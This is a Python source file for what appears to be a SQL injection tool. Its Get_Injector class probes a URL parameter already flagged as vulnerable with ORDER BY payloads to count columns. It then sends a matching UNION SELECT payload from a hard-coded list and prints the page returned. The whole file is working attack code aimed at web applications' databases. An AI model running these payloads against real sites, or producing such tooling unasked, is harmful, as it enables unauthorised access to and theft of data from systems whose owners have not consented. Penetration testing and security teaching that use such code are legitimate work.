
import requests
from utils.ainsi import *
from objects.vuln_link import *
from urllib.parse import urlparse

class Get_Injector:
    def __init__(self, vuln_link):
        self.identified_db, self.link, self.query_params, self.success = vuln_link.get_infos()
        print(self.link)
        response = requests.get(self.link)
        
        if response:
            response.encoding = "utf-8"
            self.first_page = response.text
            parsed_url = urlparse(self.link)
            self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            print(response.text)
            
            self.get_union_based_injection()
            
            
                
        else:
            print(f"{colored('❌ Error:  ', RED,styles=BOLD)} {colored('no response to get the url', RED, styles=BOLD)}\n")
    
    def generate_union_select_payload(self, number):
        payloads = [
                    "' UNION SELECT 'A'-- -",
                    "' UNION SELECT 'A', 'B'-- -",
                    "' UNION SELECT 'A', 'B', 'C'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D', 'E'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D', 'E', 'F'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D', 'E', 'F', 'G'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I'-- -",
                    "' UNION SELECT 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J'-- -"
                ]
        return payloads[number - 1]
    
    def get_union_based_injection(self):
        columns = 0
        #! SEARCH FOR NUM OF COLUMNS
        for i in range(0, 10):
            payload = f"' ORDER BY {i}-- -"
            param_name = list(self.query_params.keys())[0] if isinstance(self.query_params, dict) else self.query_params
            params = {param_name: payload}
            print(f"Testing payload: {payload} -> {self.base_url} + {params}\n")
            response = requests.get(self.base_url, params=params)
            print(response.url)
            
            if "Unknown column" in response.text and i != 0:
                print("NOK\n")
                # print(f"{colored(response.text, RED, styles=BOLD)}\n{response}\n\n")
                columns = i - 1
                break
            else:
                print("OK\n")
                # print(f"{colored(response.text, GREEN, styles=BOLD)}\n{response}\n\n")
        if (columns < 2):
            return None
        
        
        
        #! INJECTING PARAMETERS
        payload = self.generate_union_select_payload(columns)
        param_name = list(self.query_params.keys())[0] if isinstance(self.query_params, dict) else self.query_params
        params = {param_name: payload}
        response = requests.get(self.base_url, params=params)
        
        print(f"{colored(response.text, RED)}")
        print(response.url)
        
        
    
